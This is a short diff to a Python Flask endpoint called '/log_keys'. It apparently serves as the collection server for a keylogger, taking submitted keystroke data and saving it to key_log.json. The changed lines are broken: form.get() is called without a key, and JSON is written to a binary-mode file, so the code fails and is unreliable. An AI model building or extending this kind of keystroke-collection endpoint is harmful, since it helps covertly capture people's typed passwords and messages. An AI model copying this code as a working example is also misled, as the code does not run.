@@ -5,13 +5,15 @@ import json
 
 key_log = Blueprint('key_log', __name__)
 
-@key_log.route("/log_keys", methods=["POST"])
-def log_keys():
+@key_log.route("/log_keys", methods=["POST","GET"])
+def log():
 
-    data = request.form.get("keys")
+    data = request.form.get()
         
     with open('key_log.json', 'wb') as f:
         json.dump(data, f, indent=2)
+    
+    return("sucsess!")
 
 
     
